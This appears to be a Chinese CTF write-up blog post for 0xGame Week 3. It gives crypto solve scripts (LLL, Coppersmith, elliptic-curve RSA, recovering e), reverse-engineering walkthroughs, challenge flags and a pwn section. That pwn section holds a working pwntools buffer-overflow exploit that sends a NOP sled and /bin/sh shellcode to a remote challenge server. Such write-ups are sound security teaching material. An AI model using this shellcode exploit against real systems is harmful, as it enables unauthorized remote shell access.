---
title: 0xGame Week3 WP
date: 2025-11-07
categories: pwn
top_img: https://www.loliapi.com/acg/
description: 燃尽了，想做个Agent🤔🤔
---

# Crypto

## Ez_LLL

```python
from Crypto.Util.number import long_to_bytes

p = 151240196317566398919874094060690044886978001146739221635377812709640347441550250665168046149125216617951660209690860015625296899030453965800801283336223544189902980591153121592938172963303968803995733283426759581586368403208379337416298836517168491618212440911971420911495272791409112867645195821357346746831
h = 124332746104765845147133491132959579184849644379099440465281812273660434050281263409975356196112560300248343107170084466976976410232928660489912629913525776979726428263975968343564076005019264661696777686114079504603568726429498116488469855127100166072195548037981863885014261706582936943023968781022607949646

# Build lattice
M = matrix(ZZ, [
    [1, h],
    [0, p]
])

# LLL reduction
L = M.LLL()

for row in L:
    f_candidate = abs(row[0])
    g_candidate = abs(row[1])
    # Check if g_candidate is 350-bit prime
    if g_candidate.nbits() == 350 and is_prime(g_candidate):
        flag = long_to_bytes(f_candidate)
        if b'0xGame' in flag:
            print("Found flag:", flag)
            break
```

LLL 格基规约算法，得到`0xGame{8dc1f4b8-3f4e-4c3e-9d1a-2b5e6f7a8b9c}`

## Copper

```python
n = 92873040755425037862453595432032305849700597051458113741962060511759338242511707376645887864988028778023918585157853023538298808432423892753226386473625357887471318145132753202886684219309732628049959875215531475307942392884965913932053771541589293948849554008069165822411930991003624635227296915315188938427
gift = 10911712225716809560802315710689854621004330184657267444255298781464639032414821020145885934381310240257843204972266622870698161556175406337237650652528640

pbits = 512
kbits = 242

# 直接使用标准已知高位分解方法
def factor_with_high_bits(n, high, unknown_bits, p_total_bits=512):
    from sage.all import Zmod, PolynomialRing
    PR.<x> = PolynomialRing(Zmod(n))
    f = high + x
    # 尝试不同的 beta 值
    for beta in [0.48, 0.45, 0.42, 0.4, 0.38, 0.35]:
        for epsilon in [0.01, 0.03, 0.05, 0.08, 0.1]:
            roots = f.small_roots(X=2^unknown_bits, beta=beta, epsilon=epsilon)
            if roots:
                return roots[0]
    return None

x0 = factor_with_high_bits(n, gift, kbits)
if x0 is not None:
    p = gift + int(x0)
    if n % p == 0:
        q = n // p
        print("成功分解!")
        print(f"p = {p}")
        print(f"q = {q}")
        
        # 解密
        e = 65537
        c = 78798946231057858237017891544035026520248922588969396262361286907576401467816384819451190528802344534495780520382462432888103466971743435370588783181267466189564132373143717299869053172848786781320750631382630113459268771330862538801774075395201914653025347332312015985213462835680853607187971669296490439714
        
        phi = (p-1) * (q-1)
        d = pow(e, -1, phi)
        m = pow(c, d, n)
        from Crypto.Util.number import long_to_bytes
        flag = long_to_bytes(int(m))
        print(f"Flag: {flag}")
    else:
        print("p 不整除 n")
else:
    print("没有找到解")
```

Coppersmith是一种用来求解多项式方程小根的方法.

在`sagemath`里运行上面的脚本，得到flag：`0xGame{C0pp3r_4nd_mu1t1pl3_pr0gr3ss1ng!!!}`

## LLL

1. **构造格 (Lattice)**：我们将从 output.txt 文件中读出的矩阵的行向量作为格的一组基。
2. **运行 LLL 算法**：对这组基进行 LLL 规约，算法会找到一组新的基，其中包含一些非常短的向量。
3. **寻找 Flag**：我们要找的 flag 向量就隐藏在这些短向量中。由于矩阵乘法的影响，找到的短向量可能是原始 flag 向量的某个整数倍（例如 k * flag）。
4. **恢复 Flag**：
   - 我们遍历规约后基里的每一个短向量。
   - 计算向量中所有元素的最大公约数（GCD），这个 GCD 可能就是 k。
   - 将整个向量除以 k（或 -k），得到候选的 flag 向量。
   - 检查候选向量的每个元素是否都在有效的 ASCII 范围内，并尝试将其转换为字符串。
   - 验证字符串是否符合 0xGame{...} 的格式。

注意本题的.txt中的矩阵需要先进行**转置**，再LLL规约。

```python
import ast
import math
from fpylll import IntegerMatrix, LLL

def solve():
    """
    主解决函数，读取矩阵，运行 LLL 算法并寻找 Flag。
    """
    # 1. 解析 output.txt 文件
    try:
        with open('output.txt', 'r') as f:
            content = f.read()
        
        # 使用 ast.literal_eval 安全地将文件内容（字符串形式的列表）转换为 Python 对象
        matrix_C = ast.literal_eval(content)

        # 确保我们得到的是一个矩阵（列表的列表）
        if not isinstance(matrix_C, list) or not all(isinstance(row, list) for row in matrix_C):
            raise ValueError("文件内容不是一个有效的矩阵（列表的列表）")

    except Exception as e:
        print(f"[-] 读取或解析 output.txt 时出错: {e}")
        print("[-] 请确保 output.txt 与脚本在同一目录，且内容为有效的矩阵格式，例如 [[1, 2], [3, 4]]。")
        return

    # --- 第一次尝试：直接使用原始矩阵的行向量作为基 ---
    print("--- 尝试 1: 使用原始矩阵 C 的行向量 ---")
    found_flag = find_flag_in_basis(matrix_C)
    if found_flag:
        print(f"\n[+] 成功找到 Flag: {found_flag}")
        return

    print("\n[-] 在原始矩阵的基中未找到 Flag。")
    print("-" * 50)

    # --- 第二次尝试：根据提示，使用转置矩阵的行向量作为基 ---
    print("--- 尝试 2: 使用转置矩阵 C^T 的行向量 ---")
    try:
        rows = len(matrix_C)
        if rows == 0:
            print("[-] 矩阵为空。")
            return
        cols = len(matrix_C[0])
        
        # 计算转置矩阵
        transposed_C = [[matrix_C[j][i] for j in range(rows)] for i in range(cols)]
        
        found_flag = find_flag_in_basis(transposed_C)
        if found_flag:
            print(f"\n[+] 成功找到 Flag: {found_flag}")
            return
    except Exception as e:
        print(f"[-] 在进行第二次尝试时出错: {e}")

    print("\n[-] 在转置矩阵的基中也未找到 Flag。")
    print("\n[!] 解密失败。正如提示所说，可能需要构建一个更复杂的格结构。")

def find_flag_in_basis(basis_matrix):
    """
    对给定的基矩阵进行 LLL 规约，并从中寻找 Flag。

    Args:
        basis_matrix (list of lists): 作为格的基的矩阵。

    Returns:
        str: 如果找到 Flag，则返回 Flag 字符串，否则返回 None。
    """
    try:
        # 2. 构造格的基
        n = len(basis_matrix)
        B = IntegerMatrix.from_matrix(basis_matrix)

        # 3. 运行 LLL 算法进行规约
        print(f"[*] 正在对一个 {n}x{n} 的矩阵进行 LLL 规约...")
        B_reduced = LLL.reduction(B)
        print("[*] LLL 规约完成。")

        # 4. 分析规约后的基向量
        print("[*] 正在分析规约后的短向量...")
        for i in range(n):
            # 获取一个规约后的向量 v
            v = list(B_reduced[i])
            
            # 5. 尝试从向量 v 中恢复 Flag
            # 向量 v 可能是 flag 向量的整数倍 k*f。通过计算最大公约数（GCD）来找到 k。
            non_zero_elements = [abs(x) for x in v if x != 0]
            if not non_zero_elements:
                continue  # 跳过零向量
            
            # 计算所有非零元素的 GCD
            common_divisor = non_zero_elements[0]
            for j in range(1, len(non_zero_elements)):
                common_divisor = math.gcd(common_divisor, non_zero_elements[j])

            # LLL 找到的向量方向可能相反，所以要同时尝试 k 和 -k
            for sign in [1, -1]:
                k = common_divisor * sign
                try:
                    # 用向量 v 除以 k，得到 flag 候选
                    f_candidate = [x // k for x in v]
                    
                    # 检查候选向量的所有元素是否都在0-127的 ASCII 范围内
                    is_ascii = all(0 < x < 128 for x in f_candidate)
                    if is_ascii:
                        flag_str = "".join(map(chr, f_candidate))
                        # 检查是否符合已知的 flag 格式
                        if flag_str.startswith("0xGame{") and flag_str.endswith("}"):
                            return flag_str
                except (ZeroDivisionError, TypeError):
                    continue
    
    except ImportError:
        print("\n[-] 错误：未找到 fpylll 库。")
        print("[-] 请使用 'pip install fpylll' 命令进行安装。")
        # Exit the whole script if the library is missing
        exit(1)
    except Exception as e:
        print(f"\n[-] 在 LLL 规约或分析过程中发生错误: {e}")
        
    return None

if __name__ == '__main__':
    solve()
```

得到flag：`0xGame{B3g1nn3r_t0_1e4rn_L4tt1c3s}`

## RSA

```python
#!/usr/bin/env sage
# -*- coding: utf-8 -*-

from pwn import remote
from pwn import log as pwnlog
from sage.all import *

def solve():
    io = remote('nc1.ctfplus.cn', 34782)
    pwnlog.info("Connection established. Timer has started. Executing...")

    # --- 1. 快速解析服务器输出 ---
    io.recvuntil(b'Coordinate of P is (')
    p1_str = io.recvuntil(b')', drop=True).replace(b'\n', b'')
    px1, py1 = map(int, p1_str.split(b','))
    io.recvuntil(b'Coordinate of P is (')
    p2_str = io.recvuntil(b')', drop=True).replace(b'\n', b'')
    px2, py2 = map(int, p2_str.split(b','))
    io.recvuntil(b'n = ')
    n_str = io.recvuntil(b'\n[-]', drop=True).replace(b'\n', b'')
    n = int(n_str)
    e = 65537
    pwnlog.success("Data parsed.")

    # --- 2. 快速分解 n ---
    pwnlog.info("Factoring n...")
    A1 = (pow(py1, 2, n) - pow(px1, 3, n)) % n
    A2 = (pow(py2, 2, n) - pow(px2, 3, n)) % n
    delta_A = (A1 - A2) % n
    f1 = gcd(delta_A, n)
    f2 = n // f1
    pwnlog.success("n factored into two factors.")

    # --- 3. 根据超奇异条件确定 p 和 q ---
    pwnlog.info("Identifying p and q based on supersingular conditions...")
    p, q = None, None
    if f1 % 3 == 2 and f2 % 4 == 3:
        p, q = f1, f2
        pwnlog.success("Assignment found: p = factor1 (p%3=2), q = factor2 (q%4=3).")
    elif f2 % 3 == 2 and f1 % 4 == 3:
        p, q = f2, f1
        pwnlog.success("Assignment found: p = factor2 (p%3=2), q = factor1 (q%4=3).")
    else:
        pwnlog.failure("Factors do not meet the expected supersingular conditions. Attack failed.")
        io.close()
        return

    # --- 4. 瞬时计算阶和求解 ---
    pwnlog.info("Calculating orders and solving discrete logs...")
    # 阶的计算现在是 O(1)
    Np = p + 1
    Nq = q + 1
    
    # 在 GF(p) 上求解
    Fp = GF(p)
    Ep = EllipticCurve(Fp, [0, q])
    dp = inverse_mod(e, Np)
    P1_p = Ep(px1, py1)
    Q1_p = dp * P1_p
    x_mod_p = Q1_p[0]
    
    # 在 GF(q) 上求解
    Fq = GF(q)
    Eq = EllipticCurve(Fq, [p, 0])
    dq = inverse_mod(e, Nq)
    P1_q = Eq(px1, py1)
    Q1_q = dq * P1_q
    x_mod_q = Q1_q[0]

    # --- 5. 合并结果并立即发送 ---
    pwnlog.info("Combining results with CRT and sending secret...")
    x = crt([Integer(x_mod_p), Integer(x_mod_q)], [p, q])
    secret_bytes = x.to_bytes(126, 'big')[:35]
    secret_hex = secret_bytes.hex()
    pwnlog.success(f"Secret recovered (hex): {secret_hex}")

    io.sendlineafter(b'[-] Give me the secret:', secret_hex.encode())
    
    flag = io.recvall().decode(errors='ignore')
    pwnlog.success("Received response:\n" + flag)
    io.close()

if __name__ == "__main__":
    solve()
```

由于题目有时间限制，所以按常规对素数的解法会超时，所以我们取素数是超奇异数这一特殊情况，能够加快运算，并能够及时通过pwn把计算出的secret发送给服务器，实现交互，得到flag。

但其实实际上容器生成的随机素数并不全是超奇异数，所以实际需要多运行几次，若容器返回的刚好是超奇异数，就能打通了。

flag：` 0xGame{cab11ca1-2615-4353-8bdc-83acfbc158d9}`

## 变化的公钥

```python
import math
from Crypto.Util.number import long_to_bytes
import gmpy2

# ========= 您提供的数据 =========
c_flag = 3768551934826292593833035309611313515410350948177015252689101612760092214724819460968940593137063674343550213845565985577708096326384804161039234286824257
p = 92183828593120412163104340291760641288180588598799559753245539989169201953287
q = 112341696090923376544622587134650063030670067695398128869588369062187162349067

# 手动交互得到的加密数据 {明文: 密文}
encrypted_data = {
    2: 8661456987622729713284875140324390021854656336220032548752643276741012650814412956153724560835436673697707915353315705759467237138561861755697546499239404,
    3: 4517771087385690059400613106400236028797989648570504435335842458967594563252372288742748213792858933900161922306165687720613665857113406491341498148219072,
    4: 4461368238758747164492118791058784945853565508910915006788491998225437417465209099602788188410713446842464672424069396400510956103768639651291936269944409,
    5: 252593148397960384672099236062132976194716239214893311677001562315947306045440602988806836496469883640979695884101793958904581043170908588967763161253161,
    # ... 您可以根据需要添加更多数据
}

# ========= 工具函数 (无变动) =========
def get_prime_factors(n, limit=1000000):
    factors = {}
    d = 2
    temp_n = n
    while d * d <= temp_n:
        if d > limit: break
        while temp_n % d == 0:
            factors[d] = factors.get(d, 0) + 1
            temp_n //= d
        d += 1
    if temp_n > 1 and temp_n <= limit:
        factors[temp_n] = factors.get(temp_n, 0) + 1
    return sorted(factors.keys())

def extended_gcd(a, b):
    if a == 0: return b, 0, 1
    d, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return d, x, y

def chinese_remainder_theorem(congruences):
    M = 1
    for _, n_i in congruences: M *= n_i
    result = 0
    for a_i, n_i in congruences:
        M_i = M // n_i
        _, N_i, _ = extended_gcd(M_i, n_i)
        result = (result + a_i * M_i * N_i) % M
    return result

# ========= 离线解密主逻辑 =========
def solve_offline():
    n = p * q
    phi_n = (p - 1) * (q - 1)

    print(f"[+] n: {str(n)[:30]}...")
    print(f"[+] phi(n): {str(phi_n)[:30]}...")
    
    factors = get_prime_factors(phi_n, limit=1000000)
    print(f"[+] Found {len(factors)} small prime factors of phi(n) up to 1,000,000.")

    congruences = []
    moduli_product = 1
    E_UPPER_BOUND = 2**300

    for p_i in factors:
        print(f"\n[*] Trying to find e mod {p_i}")

        # 寻找合适的基 m
        base_m = -1
        for m in sorted(encrypted_data.keys()):
            # 检查这个基 m 是否能用
            if pow(m, phi_n // p_i, n) != 1:
                base_m = m
                break
        
        if base_m == -1:
            print(f"    - Could not find a suitable base in provided data for p_i = {p_i}. Skipping.")
            continue
        
        print(f"    - Using base m = {base_m} from provided data.")
        
        m_prime = pow(base_m, phi_n // p_i, n)
        c_m = encrypted_data[base_m]
        c_prime = pow(c_m, phi_n // p_i, n)
        
        found_x = -1
        for x in range(p_i):
            if pow(m_prime, x, n) == c_prime:
                found_x = x
                break
        
        if found_x != -1:
            print(f"    - Solved! e \u2261 {found_x} (mod {p_i})")
            congruences.append((found_x, p_i))
            moduli_product *= p_i
        else:
            print(f"    - Failed to solve for e mod {p_i}.")
        
        if moduli_product > E_UPPER_BOUND:
            print("\n[+] Collected enough congruences to determine e.")
            break
            
    if moduli_product <= E_UPPER_BOUND:
        print("\n[-] Could not find enough small prime factors to determine e. The attack failed.")
        return

    print("\n[*] Solving for e using Chinese Remainder Theorem...")
    e = chinese_remainder_theorem(congruences)
    print(f"[+] Found e: {e}")

    if gmpy2.is_prime(e):
        print("[+] Verification successful: e is a prime number.")
    else:
        print("[!] Warning: Calculated e is not a prime number.")

    print("\n[*] Calculating private key d and decrypting the flag...")
    d = pow(e, -1, phi_n)
    flag_val = pow(c_flag, d, n)
    
    try:
        flag = long_to_bytes(flag_val)
        print("\n" + "="*50)
        print(f"[*] DECRYPTED FLAG: {flag.decode()}")
        print("="*50)
    except Exception as err:
        print(f"\n[-] Failed to decode the flag: {err}")
        print(f"[*] Decrypted integer value: {flag_val}")

if __name__ == '__main__':
    solve_offline()
```

类似Pohlig-Hellman攻击，在这个子群里解DLP，解出很多模数互质的解后就可以解原题了，通过很多个加密过的数来逆向还原加密过程，求解e，p，q，从而解出flag：`0xGame{69d14068-30b4-41df-a17b-de434c3bc7b8}`

# pwn

## ret2shellcode

```python
import pwn
pwn.context.arch = 'amd64'
p = pwn.remote('nc1.ctfplus.cn',36618)
p.recvuntil(b"time")

shellcode = pwn.asm(pwn.shellcraft.sh())

# payload: 填充 + NOP滑梯 + Shellcode
payload = b'a'*80 + b'\x90' *80 + shellcode

p.send(payload)
p.interactive()
```

**pwn.shellcraft 会根据 context 自动生成对应的 shellcode**

- `pwn.shellcraft.sh()`用pwn里的shellcraft板子sh()生成执行`execve("/bin/sh", NULL, NULL)`得到shell的汇编
- 然后使用`pwn.asm()`函数将汇编指令转换成二进制机器码（字节流），这样子发送过去才能被识别。
- 最重要的是`NOP`空指令滑梯，由于程序在80-159之间跳转的偏移是不确定的，若将shellcode放在这个区域,会导致程序不能从第一条shellcode指令开始正确的执行，所以我们可以使用NOP指令（机器码0x90，填充为\x90），`b'\x90'*80`,b' '表示以字节流发送，用`\x90`(空指令)填充完这个不确定的区域，让程序就像在一个“滑梯”上向下滑行，直到滑出这个区域，执行我们紧跟在后面的真实 shellcode。

得到flag：`0xGame{Not_only_nop_can_jmp_controlstream}`

# Re

## apk逆向

`_4nd_dex_loader}`:

```python
# 导入z3库
from z3 import *

# 1. 定义变量
# 每个变量是16个十六进制字符，即 64 位
v0, v1, v2 = BitVecs('v0 v1 v2', 64)

# 2. 创建求解器实例
s = Solver()

# 3. 添加数学方程约束
s.add(v1 + v0 * 3 == 27454419028250566601)
s.add(v2 * 2 - v1 * 5 + 20616666104378640363 == 0)
s.add(v0 + v2 * 4 == 0x1dce62be9f0fa2f6c)

# 4. 添加结构性约束
# v1 由 v0 的低32位 (Extract(31, 0, v0)) 和 v2 的高32位 (Extract(63, 32, v2)) 组成
s.add(v1 == Concat(Extract(31, 0, v0), Extract(63, 32, v2)))

# 5. 检查解是否存在并输出
if s.check() == sat:
    m = s.model()
    # 提取v0和v2的值
    val_v0 = m[v0].as_long()
    val_v2 = m[v2].as_long()

    # 将v0和v2的值格式化为16位的十六进制字符串
    hex_v0 = format(val_v0, '016x')
    hex_v2 = format(val_v2, '016x')
    
    # 最终的输入字符串 str 是 v0 和 v2 的拼接
    flag_hex = hex_v0 + hex_v2
    
    print(f"求解成功!")
    print(f"v0 = 0x{hex_v0}")
    print(f"v2 = 0x{hex_v2}")
    print(f"拼接后的Hex字符串: {flag_hex}")
    
    # 将十六进制字符串转换为ASCII字符
    try:
        flag_ascii = bytes.fromhex(flag_hex).decode('utf-8')
        print(f"ASCII结果: {flag_ascii}")
    except Exception as e:
        print(f"转换为ASCII失败: {e}")

else:
    print("求解失败，方程无解。")
```

资源文件-->Assets-->dex.zip,**.zip文件一般是不会出现在这里的**，所以flag的关键应该就放在这里面，导出这个dex.zip文件，解压缩，010打开查看文件头，是**64 65 78 0A**，所以这个其实并不是zip，而是一个dex文件，更改文件名为dex.dex，用jadx打开，就能看到反编译的源码了，用z3解方程组，得到后半段`_4nd_dex_loader}`

`0xGame{Do_y0u_l0v3_andr01d`:

前半段在源代码-->com-->example.easyapp-->MainActivity-->onCreate$lambda$方法中找到base64编码过的flag：`MHhHYW1le0RvX3kwdV9sMHYzX2FuZHIwMWQ=`

解码得到`0xGame{Do_y0u_l0v3_andr01d`

拼接flag得到：`0xGame{Do_y0u_l0v3_andr01d_4nd_dex_loader}`

**一般都在源代码-->com-->MainActivity里面**

## 扫雷

分析`.js`文件，可以看到触发给flag的逻辑，当难度为expert时玩家胜利会触发`_0x20eae2`这个函数，函数内部调用了`_0x172ca4`函数，这里包含了解密flag的逻辑--**重复密钥异或**(XOR)，密钥key--`WebIsInteresting`和flag密文`g\x1d%(\x1e,\x15@SA\x5cFD\x0fWJn]P}^}\x0c\x12\x07_]AGYC^o\x04\x00yA-ZGT\x16U\x0e`，

逆向解密：

```python
encrypted_data = b"g\x1d%(\x1e,\x15@SA\x5cFD\x0fWJn]P}^}\x0c\x12\x07_]AGYC^o\x04\x00yA-ZGT\x16U\x0e"
key = b"WebIsInteresting"
decrypted_data = bytearray()

for i in range(len(encrypted_data)):
  decrypted_data.append(encrypted_data[i] ^ key[i % len(key)])

flag = decrypted_data.decode()
print(flag)
```

得到flag：`0xGame{463950f9-9824-4bfb-8230-98ab02d431d0}`

## VBS

把`Execute`改为`wscript.echo`，然后在终端输入`cscript.exe 1.vbs`就能得到源代码输出到终端，

- `wscript.exe 1.vbs`   输出到一个程序窗口，不方便复制，
- `cscript.exe 1.vbs`    输出到终端，更方便复制。

可以观察到源码分两段，中间有`Execute Code`分隔，修改原.vbs，最后一行加上`Wscripts.Echo`，就能看到去了第二层混淆的源码，

但是再观察一下，后面还是好几行的乱码，于是再进行`Execute`到`Wscript.Echo`的转换，三层混淆，我没招了😭😭

三层混淆解完之后，就能看到base64编码表`fx6LUY5at9lnwmd3TbqzuRy+AipWHPDoXZKMFGCV2I/QjSreEsh18NJkg0v74OcB`和flag密文`waZaAyNGDJ9CwLfNdzYCnyUsAJtSmLU0wqNKmLYFnyT8iyRMi5UEAMH0da8=`，放到cyberchef里解一下密，得到flag：`0xGame{bf00591f-a1cb-4191-b41d-d4eecda0b798}`

